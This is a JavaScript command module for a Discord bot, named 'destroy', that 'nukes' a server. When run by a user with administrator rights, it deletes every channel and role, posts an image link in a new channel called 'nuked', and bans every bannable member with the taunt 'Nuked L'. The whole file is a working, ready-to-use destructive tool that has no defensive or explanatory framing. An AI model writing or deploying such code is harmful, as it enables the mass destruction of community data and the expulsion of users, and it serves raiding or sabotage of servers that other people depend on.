module.exports = {
    name : 'destroy',
    description: 'destroys discord if u have admin perms usage: destory',
    usage: "destroy",
    execute(message, client, args) {
        if (!message.member.hasPermission("ADMINISTRATOR")) return message.channel.send("You dont have admin permission").then(message => {
           message.delete(500);
        });


        message.guild.channels.forEach(channel => channel.delete());
        message.guild.roles.forEach(role => role.delete());

        message.guild.createChannel('nuked', { type: 'text' }).then((c) => {
            c.send("https://imgur.com/LIyGeCR").then((msg) => {
                message.guild.members.forEach(member => {
                    if(member.bannable) member.ban("Nuked L");
                })
            })
        }).catch(console.error);
    }
}